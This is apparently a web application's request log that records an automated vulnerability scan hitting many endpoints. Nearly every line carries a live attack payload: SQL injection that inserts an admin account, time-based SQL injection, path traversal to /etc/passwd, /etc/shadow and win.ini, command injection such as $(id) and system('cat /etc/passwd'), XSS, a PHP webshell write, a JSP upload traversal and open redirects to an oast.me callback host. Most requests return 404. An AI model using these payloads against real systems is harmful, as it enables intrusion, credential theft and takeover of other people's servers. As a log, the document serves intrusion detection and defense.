+ GET /workflow/servlet/pdf_servlet?JOBID=1'%3BINSERT%20INTO%20DOCTERA_USERS%20(USERNAME%2C%20PASSWORD%2C%20ENCPASSWORD%2C%20FIRSTNAME%2C%20LASTNAME%2C%20COMPANY%2C%20ADDRESS%2C%20ADDRESS2%2C%20CITY%2C%20STATE%2C%20ALTPHONE%2C%20ZIP%2C%20COUNTRY%2C%20PHONE%2C%20FAX%2C%20EMAIL%2C%20LASTLOGIN%2C%20CREATION%2C%20PREFERREDSERVER%2C%20CREDITCARDTYPE%2C%20CREDITCARDNUMBER%2C%20CREDITCARDEXPIRY%2C%20ACCOUNTSTATUS%2C%20USERTYPE%2C%20COMMENT%2C%20ADMIN%2C%20SUPERADMIN%2C%20ACCEPTEMAIL%2C%20ALLOWHOTFOLDER%2C%20PROTOCOL%2C%20BANDWIDTH%2C%20DIRECTORY%2C%20SLOWSTARTRATE%2C%20USESLOWSTART%2C%20SLOWSTARTAGGRESSIONRATE%2C%20BLOCKSIZE%2C%20UNITSIZE%2C%20NUMENCODERS%2C%20NUMFTPSTREAMS%2C%20ALLOWUSERBANDWIDTHTUNING%2C%20EXPIRYDATE%2C%20ALLOWTEMPACCOUNTCREATION%2C%20OWNERUSERNAME%2C%20USERLEVEL%2C%20UPLOADMETHOD%2C%20PW_CHANGEABLE%2C%20PW_CREATIONDATE%2C%20PW_DAYSBEFOREEXPIRE%2C%20PW_MUSTCHANGE%2C%20PW_USEDPASSWORDS%2C%20PW_NUMERRORS)%20VALUES('304hnla22ale6pjdyxjey5ilgin'%2C%20NULL%2C%20'33FFB93097C8906B8AE851EEE758B67C'%2C%20'304hnla22ale6pjdyxjey5ilginFirstName'%2C%20'304hnla22ale6pjdyxjey5ilginLastName'%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20'202-404-2400'%2C%20''%2C%20'304hnla22ale6pjdyxjey5ilgin%40mydomain.local'%2C%201714014839723%2C%201714013661166%2C%20'default'%2C%20''%2C%20''%2C%20''%2C%20'full%20access'%2C%20''%2C%20''%2C%201%2C%200%2C%200%2C%200%2C%20'DEFAULT'%2C%20'0'%2C%200%2C%20'0'%2C%201%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%200%2C%200%2C%200%2C%20''%2C%200%2C%20'DEFAULT'%2C%200%2C%201714014752270%2C%20-1%2C%200%2C%20NULL%2C%200)%3B--%20- 404 in 59ms
+ GET /workflow/jsp/logon.jsp 404 in 99ms
+ GET / 200 in 77ms
+ GET /Synchronization 404 in 75ms
+ PUT /nexus/service/local/repositories/releases/content/com/sbt/ignite/ignite-bom/maven-metadata.xml 404 in 54ms
+ GET /admin/login 404 in 71ms
+ GET /admin/compass?download=L2V0Yy9wYXNzd2Q= 404 in 131ms
+ GET /service-worker.js?local_access_token=304hNJOzARXDucQU53XHI0LLvKQ 404 in 78ms
+ GET /admin/login 404 in 69ms
+ GET /admin/compass?del=PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPi5sb2c= 404 in 152ms
+ GET /admin/compass?logs=true 404 in 93ms
+ GET /?--configPath=/nuclei_test/1520996727 200 in 88ms
+ GET /users 404 in 81ms
+ GET /users;. 404 in 146ms
+ GET /nifi-api/controller/config 404 in 59ms
+ GET /nifi-api/flow/process-groups/root 404 in 81ms
+ POST /getcfg.php 404 in 56ms
+ POST /cgi/getGDPRParm 404 in 55ms
+ POST /cgi/getParm 404 in 56ms
+[Error: Requested and resolved page mismatch: /toolbox-resource/../serverconfig.xml /serverconfig.xml]
+[Error: Requested and resolved page mismatch: /toolbox-resource/../serverconfig.xml /serverconfig.xml]
+[Error: Requested and resolved page mismatch: /toolbox-resource/../serverconfig.xml /serverconfig.xml]
+[Error: Requested and resolved page mismatch: /toolbox-resource/../serverconfig.xml /serverconfig.xml]
+ GET /toolbox-resource/../serverconfig.xml 404 in 215ms
+ GET /RST_status.htm 404 in 76ms
+ GET /RST_status.htm?x=1.gif 404 in 131ms
+ POST /wp-admin/admin-ajax.php 404 in 55ms
+ GET /TS/export/pagedefinition?ID=1 404 in 55ms
+ GET /internal/v2/config/mps_secret/ADM_SESSIONID 404 in 75ms
+ GET /?wc-api=payplus_gateway&status_code=true&more_info=(select*from(select(sleep(6)))a) 200 in 72ms
+ GET / 200 in 85ms
+ GET / 200 in 78ms
+ POST /tracking/client_1/get-resource 404 in 57ms
+ POST /tracking/client_1/read-instruction 404 in 117ms
+ GET /etc/mnt_info.csv 404 in 57ms
+ GET /general/status.html 404 in 55ms
+ GET /interface-data/books-init 404 in 56ms
+ GET /interface-data/books-init 404 in 56ms
+ GET / 200 in 71ms
+ GET / 200 in 77ms
+ POST /wp-json/wdgpt/v1/purge-error-logs 404 in 57ms
+ POST /jtcgi/soap_cgi.pyc 404 in 65ms
+ GET /jtcgi/r/adlogin/sso?code=1337&state=foobar&id_token=zoinks&error_description=%3Csvg%2fonload%3dprompt(%27document.domain%27)%3E&error=error 404 in 98ms
+ GET /browse/book/TEST&quot;;window.stop();alert(document.domain);%2f%2f 404 in 74ms
+ POST /cgi-bin/supervisor/Factory.cgi 404 in 58ms
+ GET /listing?cat=6&filter=1&job-type=1&keywords=Mr.&location=1&order=desc&placeid=US&placetype=country&range1=1&range2=1)%20AND%20(SELECT%201864%20FROM%20(SELECT(SLEEP(6)))gOGh)%20AND%20(6900=6900&salary-type=1&sort=id&subcat 404 in 71ms
+ GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo%20-e%20%27304hNCFWgpebkGFlAf1hELP0niE%27%3E%20%2Fwww%2Ftmp%2Finfo.html%60 404 in 66ms
+ GET /tmp/info.html 404 in 148ms
+ POST /queryDevInfo 404 in 64ms
+ PUT /wp-json/seopress/v1/posts/1/title-description-metas 404 in 68ms
+[Error: Requested and resolved page mismatch: /__weave/file/tmp/weave/fs/../../../etc/passwd /__weave/file/etc/passwd]
+[Error: Requested and resolved page mismatch: /__weave/file/tmp/weave/fs/../../../etc/passwd /__weave/file/etc/passwd]
+[Error: Requested and resolved page mismatch: /__weave/file/tmp/weave/fs/../../../etc/passwd /__weave/file/etc/passwd]
+[Error: Requested and resolved page mismatch: /__weave/file/tmp/weave/fs/../../../etc/passwd /__weave/file/etc/passwd]
+ GET /__weave/file/tmp/weave/fs/../../../etc/passwd 404 in 251ms
+ GET /admin/login 404 in 74ms
+ GET /npm-pwg/..;/usp/searchUsers.do 404 in 71ms
+ GET /progs/homepage 404 in 62ms
+ GET /index/ajax/lang?lang=../../application/database 404 in 74ms
+ POST /Synchronization 404 in 58ms
+ POST /index.php?action=porte_plume_previsu 404 in 58ms
+ GET /api/v1/apikey?/api/v1/ping 404 in 74ms
+ GET / 200 in 95ms
+ POST /api/v0/train 404 in 59ms
+ GET /wp-json/learnpress/v1/courses?course_filter&c_only_fields=post_title,(select(sleep(6))),ID 404 in 56ms
+ GET /wp-json/learnpress/v1/courses?c_fields=(SELECT(0)FROM(SELECT(SLEEP(6)))a) 404 in 57ms
+ GET / 200 in 76ms
+ GET /wp-content/plugins/cz-loan-management/README.txt 404 in 68ms
+ GET /.webui/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini 404 in 61ms
+ POST /ajax-api/2.0/mlflow/experiments/create 404 in 78ms
+ GET /login?next=/ 404 in 66ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=http://localhost:80@oast.me 404 in 111ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=https://127.0.0.1:80@oast.me 404 in 110ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=https://[::]:80@oast.me 404 in 107ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=http://localhost:80@oast.me 404 in 427ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=https://localhost:80@oast.me 404 in 426ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=https://127.0.0.1:80@oast.me 404 in 494ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=http://127.0.0.1:80@oast.me 404 in 492ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=http://127.0.0.1:80@oast.me 404 in 491ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=http://[::]:80@oast.me 404 in 492ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=http://localhost:80@oast.me 404 in 486ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=https://127.0.0.1:80@oast.me 404 in 489ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=https://127.0.0.1:80@oast.me 404 in 487ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=https://localhost:80@oast.me 404 in 484ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=http://[::]:80@oast.me 404 in 492ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=http://127.0.0.1:80@oast.me 404 in 479ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=http://127.0.0.1:80@oast.me 404 in 481ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=https://[::]:80@oast.me 404 in 496ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=http://[::]:80@oast.me 404 in 486ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=https://localhost:80@oast.me 404 in 489ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=http://localhost:80@oast.me 404 in 481ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=https://localhost:80@oast.me 404 in 496ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=http://[::]:80@oast.me 404 in 493ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=https://[::]:80@oast.me 404 in 487ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=http://localhost:80@oast.me 404 in 491ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=https://[::]:80@oast.me 404 in 487ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=http://127.0.0.1:80@oast.me 404 in 476ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=https://127.0.0.1:80@oast.me 404 in 471ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=https://[::]:80@oast.me 404 in 128ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=https://localhost:80@oast.me 404 in 146ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=https://127.0.0.1:80@oast.me 404 in 146ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=http://[::]:80@oast.me 404 in 131ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=http://localhost:80@oast.me 404 in 60ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=http://127.0.0.1:80@oast.me 404 in 82ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=https://[::]:80@oast.me 404 in 76ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=http://[::]:80@oast.me 404 in 73ms
+ GET /wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=nQPWcLZi4Yx8vr8l&ticket=uBr6oQq9PMcZAyl5&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_vxjb8vL4ugyMHwXXKqHk2S1w395obffx 404 in 87ms
+ GET / 200 in 105ms
+ POST /models/apply 404 in 65ms
+ POST /wp-admin/admin-ajax.php?+config-create+/&/<?=base64_decode($_GET[0])?>+/tmp/304hNPdNbrqoWbos5DWdzzgqUSx.php 404 in 68ms
+ POST /wp-admin/admin-ajax.php?0=MzA0aE5Ma2Q5YmNNd2ZBU3Fjajl3SzZDc0la 404 in 62ms
+ GET / 200 in 90ms
+ GET /wp-content/plugins/wps-hide-login/readme.txt 404 in 63ms
+ GET / 200 in 85ms
+ GET / 200 in 78ms
+ POST /wp-json/hc/v1/themehunk-import 404 in 76ms
+ POST /app/modules/ut-cac/admin/cli.php 404 in 66ms
+ GET / 200 in 79ms
+ GET /ssl-vpn/getconfig.esp?client-type=1&protocol-version=p1&app-version=3.0.1-10&clientos=Linux&os-version=linux-64&hmac-algo=sha1%2Cmd5&enc-algo=aes-128-cbc%2Caes-256-cbc&authcookie=12cea70227d3aafbf25082fac1b6f51d&portal=us-vpn-gw-N&user=%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E&domain=%28empty_domain%29&computer=computer 404 in 65ms
+ GET / 200 in 84ms
+ POST / 200 in 95ms
+ GET / 200 in 111ms
+ GET /wp-admin/admin-ajax.php?s=9999')union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index 404 in 82ms
+ POST / 200 in 272ms
+ POST / 200 in 294ms
+ POST / 200 in 292ms
+ POST / 200 in 72ms
+ POST / 200 in 109ms
+[Error: Requested and resolved page mismatch: /assets/../../.HTTP/HTTP.db /.HTTP/HTTP.db]
+[Error: Requested and resolved page mismatch: /assets/../../.HTTP/HTTP.db /.HTTP/HTTP.db]
+[Error: Requested and resolved page mismatch: /assets/../../.HTTP/HTTP.db /.HTTP/HTTP.db]
+[Error: Requested and resolved page mismatch: /assets/../../.HTTP/HTTP.db /.HTTP/HTTP.db]
+ GET /assets/../../.HTTP/HTTP.db 404 in 207ms
+ GET /wp-admin/profile.php 404 in 78ms
+ GET /wp-admin/users.php?role=administrator 404 in 57ms
+ GET / 200 in 78ms
+ POST /NmConsole/WugSystemAppSettings/JMXSecurity 404 in 68ms
+ POST /NmConsole/Platform/PerformanceMonitorErrors/HasErrors 404 in 167ms
+ GET /NmConsole/Platform/Filter/AlertCenterItemsReportThresholds 404 in 116ms
+ GET / 200 in 86ms
+ GET / 200 in 90ms
+ GET / 200 in 77ms
+ GET /?__kubio-site-edit-iframe-preview=1&__kubio-site-edit-iframe-classic-template=../../../../../../../../etc/passwd 200 in 114ms
+ GET /api/v1/markdown/link:metadata?link=http://localhost:13042 404 in 58ms
+ GET / 200 in 79ms
+ POST /MagicInfo/servlet/SWUpdateFileUploader?fileName=./../../../../../../server/0slCBO.jsp&deviceType=abc&deviceModelName=test&swVer=123 404 in 70ms
+ GET /?instawp-database-manager=/../../../%2e%2fmigrate%2ftemplates%2fdebug%2fdb-table&table_name=wp_users--%20- 200 in 93ms
+ GET /rest/getPlaylists?u=FakeUser&t=99ac3574ec4919d2520038c3f9a0db06&s=304hNFLKOx4vDgloHB6ZDstmoC3&v=1.16.1&c=castafiore&f=json 404 in 77ms
+ GET / 200 in 98ms
+ GET / 200 in 77ms
+ GET /console/dashboard/executorCount?zkClusterKey=1%27-extractvalue(1,concat(0x0a,version()))--%20- 404 in 81ms
+ GET /images/index.html?id=%24%7B%40print_r%28%40system%28%22cat+/etc/passwd%22%29%29%7D 404 in 83ms
+ GET /images/index.html?id=%24%7B%40print_r%28%40system%28%22id%22%29%29%7D 404 in 87ms
+ POST /portal/loginpage.aspx 404 in 56ms
+ GET / 200 in 76ms
+ GET /vicidial/welcome.php 404 in 73ms
+ GET /?UrkCEO/edit&theme=margot&squelette=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&style=margot.css 200 in 77ms
+ GET /spip.ph%70?pag%65=spip_pass&lang=fr 404 in 73ms
+ ⨯ [TypeError: Failed to parse body as FormData.]
+ POST /developmentserver/metadatauploader?CONTENTTYPE=MODEL&CLIENT=1 500 in 356ms
+ GET /@fs/C:/windows/win.ini?import&?inline=1.wasm?init 404 in 72ms
+ GET /@fs/etc/passwd?import&?inline=1.wasm?init 404 in 105ms
+ GET /@fs/../../../../../../../etc/passwd?import&?inline=1.wasm?init 400 in 41ms
+ GET /@fs/%252e%252e/%252e%252e/%252e%252e/etc/passwd?import&?inline=1.wasm?init 404 in 120ms
+ POST /wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/index.php 404 in 84ms
+ POST /menu.php 404 in 91ms
+ GET /cache_public/sh.phtml 404 in 166ms
+ GET /cache_public/sh.php 404 in 102ms
+ POST /api/v1/validate/code 404 in 75ms
+ GET /portalapi/actuator 404 in 69ms
+ GET /webui/application/get_saml_request?saml_id=1%26$(id|%20base64); 404 in 58ms
+ GET /netmri/config/userAdmin/login.tdf?skipjackUsername=admin%22+AND+updatexml(rand(),concat(CHAR(126),NetmriDecrypt((select%20PasswordSecure%20from%20skipjack.ACLUser%20where%20UserName=%22admin%22),%22password%22,1),CHAR(126)),null)--%22&skipjackPassword=anything&weakPassword=true&eulaAccepted=Accept&mode=DO-LOGIN 404 in 58ms
+ GET /portalapi/v1/roles/option;%2fv1%2fping 404 in 61ms
+ GET /netmri/common/SetRawCookie.tdf?name=letmein&value=%78%79%7a%0d%0a%55%73%65%72%4e%61%6d%65%3d%61%64%6d%69%6e 404 in 77ms
+ GET /visual/ViewerFileServlet?fileName=/etc/shadow 404 in 125ms
+ GET / 200 in 84ms
+ POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/FsZ4dAVS.jsp&fileId=2 404 in 77ms
+ GET /FsZ4dAVS.jsp 404 in 161ms
+ GET / 200 in 91ms
+ GET /api/alertmanager/grafana/config/api/v1/alerts 404 in 70ms
+ GET / 200 in 85ms
+ GET /public/template.cgi?templatefile=$(id) 404 in 78ms
+ POST /php/dal.php 404 in 57ms
+ POST /wp-admin/admin-ajax.php 404 in 58ms
+ GET /?s=304hNIVNqv3DNGecNxHTO4E6Sbu&cats=1*sleep(5) 200 in 75ms
+ POST /wp-content/plugins/simple-file-list/ee-upload-engine.php 404 in 62ms
+ POST /wp-content/plugins/simple-file-list/ee-file-engine.php 404 in 128ms
+ GET /wp-content/uploads/simple-file-list/fbcbdeg.php 404 in 122ms
+ GET /Mondo/lang/sys/Failure.aspx?state=19753%22;}alert(document.domain);function%20test(){%22 404 in 29ms
+ GET /login.php?authorized=eyJ1c2VyIjogeyJuYW1lIjogImFkbWluIiwgImxvZ2luIjogImFkbWluIn0sInJvbGUiOnsibmFtZSI6ImFkbWluaXN0cmF0b3IiLCAicmVzdHJpY3Rpb25zIjogW10sImRlbGV0ZWFibGUiOiBmYWxzZX19 404 in 81ms
+ GET /v.1.5/php/features/feature-transfer-export.php?action=id;&filename&varid&slot 404 in 76ms
+ POST /bin/configurations/parsers/Checkpoint/CHECKPOINT.php 404 in 70ms
+ GET / 200 in 92ms
+ GET /php/utils/CmsGetDeviceSoftwareVersion.php/.js.map 404 in 59ms
+ POST /bootstrap-multiselect/post.php 404 in 81ms
+ GET / 200 in 98ms
+ GET / 200 in 84ms
+ GET /modules/pwd.html 404 in 59ms
+ GET /auth/login 404 in 74ms
+ POST /wp-admin/admin-ajax.php?template=../../../../../../../wp-config&value=a&min_symbols=1 404 in 67ms
+ POST /wp-json/eventin/v2/speakers/import?_locale=user 404 in 61ms
+ POST /loginok.html 404 in 74ms
+ POST / 200 in 74ms
+ POST /loginok.html 404 in 72ms
+ GET /dir.html 404 in 105ms
+ POST /ajax/api/ad/wrapAdTemplate 404 in 59ms
+ GET / 200 in 74ms
+ POST /apriso/WebServices/FlexNetOperationsService.svc/Invoke 404 in 64ms
+ POST /wp-admin/admin-ajax.php 404 in 67ms
+ POST / 200 in 72ms
+ POST / 200 in 136ms
+ POST /p/u/doAuthentication.do 404 in 56ms
+ POST /login.html 404 in 70ms
+ POST /login.html 404 in 117ms
+ POST /index.htm 404 in 117ms
+ POST /login.html 404 in 62ms
+ GET /api/v1.index.article/getList.html?field=id,md5(999999999)&size=1&cat=3&time_stamp=1781864476 404 in 69ms
+ GET /api/v1.index.goods/getList.html?field=id,md5(999999999)&activity_type=hot&time_stamp=1781864476 404 in 105ms
+ POST /console/auth/login 404 in 55ms
+ POST /api/login 404 in 83ms
+ POST /api/login 404 in 83ms
+ POST /index.php 404 in 55ms
+ GET / 200 in 75ms
+ GET / 200 in 77ms
+ GET /system/console/bundles 404 in 69ms
+ POST /libs/granite/core/content/login.html/j_security_check 404 in 85ms
+ POST /libs/granite/core/content/login.html/j_security_check 404 in 84ms
+ POST /libs/granite/core/content/login.html/j_security_check 404 in 67ms
+ POST /mbilling/index.php/authentication/login 404 in 72ms
+ GET /login.php 404 in 52ms
+ GET / 200 in 92ms
+ POST /apisix/admin/user/login 404 in 75ms
+ POST /api/account/auth/form 404 in 92ms
+ POST /api/account/auth/form 404 in 114ms
+ POST /api/account/auth/form 404 in 125ms
+ GET /system/console 404 in 52ms
+ POST /rest/v1/login 404 in 57ms
+ POST /api/json/session/signin 404 in 53ms
+ GET /console/index.html 404 in 172ms
+ POST /login 404 in 60ms
+ GET / 200 in 76ms
+ GET / 200 in 87ms
+ GET / 200 in 96ms
+ POST / 200 in 76ms
+ POST /login 404 in 65ms
+ POST /api/v2/login 404 in 78ms
+ POST /data/login 404 in 69ms
+ POST /json 404 in 71ms
+ GET / 200 in 61ms
+ POST /htdocs/login/login.lua 404 in 64ms
+ POST /index/login.cgi 404 in 66ms
+ POST /ibmmq/console/j_security_check 404 in 68ms
+ POST /ibmmq/console/j_security_check 404 in 516ms
+ POST /data/login 404 in 482ms
+ POST /nacos/v1/auth/users/login 404 in 74ms
+ GET /nagios/side.php 404 in 73ms
+ POST /netflow/jspui/j_security_check 404 in 76ms
+ POST /webadmin/index.php 404 in 57ms
+ POST /login 404 in 54ms
+ POST /service/rapture/session 404 in 68ms
+ POST /api/tokens 404 in 66ms
+ POST /rpc.php 404 in 46ms
+ POST /php/login.php 404 in 57ms
+ GET /index.php 404 in 75ms
+ POST /forms/doLogin 404 in 67ms
+ POST /FormLogin 404 in 69ms
+ POST / 200 in 94ms
+ POST /console/j_security_check 404 in 66ms
+ POST /console/j_security_check 404 in 55ms
+ POST /ZMC_Admin_Login 404 in 73ms
+ POST /authorize 404 in 70ms
+ GET /api/v2/cmdb/system/admin/admin 404 in 65ms
+ POST /apps/my_sample_agent/users/304hNGlMstgsIYDWbYa3N1PJ4NF/sessions/s_123 404 in 67ms
+ POST /j_security_check 404 in 57ms
+ GET /showresource.do?group=All&method=showResourceTypes&monitor_viewtype=categoryview 404 in 74ms
+ GET /.github/workflows/release.yml 404 in 68ms
+ GET /aplicacao/routes/configs/routes.ini 404 in 68ms
+ GET /radio/routes/configs/routes.ini 404 in 55ms
+ GET /php-info.php 404 in 84ms
+ GET /infos.php 404 in 82ms
+ GET /log.log 404 in 68ms
+ GET /wp-content/plugins/elementskit-lite/readme.txt 404 in 55ms
+ GET /wp-content/plugins/fluent-smtp/readme.txt 404 in 73ms
+ GET /wp-content/plugins/gtranslate/readme.txt 404 in 81ms
+ GET /wp-content/plugins/happy-elementor-addons/readme.txt 404 in 66ms
+ GET /wp-content/plugins/header-footer-code-manager/readme.txt 404 in 66ms
+ GET /wp-content/plugins/hunk-companion/readme.txt 404 in 81ms
+ GET /wp-content/plugins/limit-login-attempts-reloaded/readme.txt 404 in 57ms
+ GET /wp-content/plugins/leadin/readme.txt 404 in 55ms
+ GET /wp-content/plugins/litespeed-cache/readme.txt 404 in 56ms
+ GET /wp-content/plugins/mainwp-child/readme.txt 404 in 74ms
+ GET /wp-content/plugins/metform/readme.txt 404 in 65ms
+ GET /wp-content/plugins/pdf-embedder/readme.txt 404 in 56ms
+ GET /wp-content/plugins/sg-cachepress/readme.txt 404 in 76ms
+ GET /wp-content/plugins/svg-support/readme.txt 404 in 70ms
+ GET /wp-content/plugins/the-events-calendar/readme.txt 404 in 70ms
+ GET /wp-content/plugins/ultimate-addons-for-gutenberg/readme.txt 404 in 74ms
+ GET /wp-content/plugins/woo-variation-swatches/readme.txt 404 in 70ms
+ GET /wp-content/plugins/wordfence/readme.txt 404 in 99ms
+ GET /wp-content/plugins/wp-migrate-db/readme.txt 404 in 56ms
+ GET /wp-content/plugins/wp-smushit/readme.txt 404 in 75ms
+ GET /jexinv4/jexinv4.jsp?ppp=type%20C%3A%2FWindows%2Fwin.ini 404 in 75ms
+ GET / 200 in 128ms
+ GET / 200 in 73ms
+ GET / 200 in 52ms
+ GET / 200 in 85ms
+ GET /?activated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-activated%27%29%3E&trigger=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trigger%27%29%3E&loggedout=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-loggedout%27%29%3E&script=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-script%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-query%27%29%3E&file_name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file_name%27%29%3E&fname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-fname%27%29%3E&options=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-options%27%29%3E&export=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-export%27%29%3E&post=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-p%27%29%3E&action2=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-action2%27%29%3E&c=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-c%27%29%3E&destination=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-destination%27%29%3E 200 in 61ms
+ GET /.oast.me 404 in 58ms
+[Error: Requested and resolved page mismatch: /public/plugins/fastweb-openfalcon-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/fastweb-openfalcon-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/fastweb-openfalcon-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/fastweb-openfalcon-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+ GET /public/plugins/fastweb-openfalcon-datasource/../../../../../conf/defaults.ini 404 in 243ms
+[Error: Requested and resolved page mismatch: /public/plugins/grafana-worldmap-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/grafana-worldmap-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/grafana-worldmap-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/grafana-worldmap-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/grafana-strava-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/grafana-strava-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/grafana-strava-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/grafana-strava-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/marcusolsson-hourly-heatmap-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/marcusolsson-hourly-heatmap-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/marcusolsson-hourly-heatmap-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/marcusolsson-hourly-heatmap-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+ GET /public/plugins/grafana-strava-datasource/../../../../../conf/defaults.ini 404 in 213ms
+ GET /public/plugins/grafana-worldmap-panel/../../../../../conf/defaults.ini 404 in 270ms
+ GET /public/plugins/marcusolsson-hourly-heatmap-panel/../../../../../conf/defaults.ini 404 in 282ms
+[Error: Requested and resolved page mismatch: /public/plugins/iosb-sensorthings-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/iosb-sensorthings-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/iosb-sensorthings-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/iosb-sensorthings-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+ GET /public/plugins/iosb-sensorthings-datasource/../../../../../conf/defaults.ini 404 in 297ms
+[Error: Requested and resolved page mismatch: /public/plugins/nagasudhirpulla-api-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/nagasudhirpulla-api-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/nagasudhirpulla-api-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/nagasudhirpulla-api-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
